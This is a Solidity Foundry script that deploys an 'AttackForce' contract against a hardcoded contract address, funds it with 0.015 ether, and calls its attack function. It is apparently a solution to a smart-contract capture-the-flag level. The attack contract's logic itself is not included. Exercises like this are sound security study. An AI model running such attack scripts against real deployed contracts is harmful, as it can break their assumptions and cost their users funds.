//SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {AttackForce} from "../src/AttackForce.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackForceScript is Script {
    AttackForce attack;

    function run() external returns(AttackForce){
        vm.startBroadcast();
        attack = new AttackForce(0xD3e4517DeecF8450E95F7327e93A8f7e4e12c29F);
        vm.stopBroadcast();
        return attack;
    }

    function deposit() external {
        vm.startBroadcast();
        attack.deposit{value: 0.015 ether}();
        vm.stopBroadcast();
    }

    function attack1() external{
        vm.startBroadcast();
        attack.attack();
        vm.stopBroadcast();
    }


}